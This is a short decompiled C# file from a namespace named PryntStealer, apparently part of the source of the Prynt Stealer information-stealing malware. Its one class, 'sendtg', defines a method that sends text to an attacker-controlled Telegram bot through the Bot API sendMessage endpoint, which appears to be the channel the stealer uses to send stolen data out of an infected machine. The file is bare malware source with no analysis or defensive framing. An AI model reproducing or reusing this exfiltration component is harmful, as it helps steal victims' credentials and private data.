using System;
using System.Net;

namespace PryntStealer
{
	// Token: 0x0200000F RID: 15
	internal class sendtg
	{
		// Token: 0x0600006A RID: 106 RVA: 0x0000A990 File Offset: 0x00008B90
		public static void sendText(string text, string ChatID, string bottoken)
		{
			using (WebClient webClient = new WebClient())
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				webClient.DownloadString(string.Concat(new string[]
				{
					"https://api.telegram.org/bot",
					bottoken,
					"/sendMessage?chat_id=",
					ChatID,
					"&text=",
					text
				}));
			}
		}
	}
}
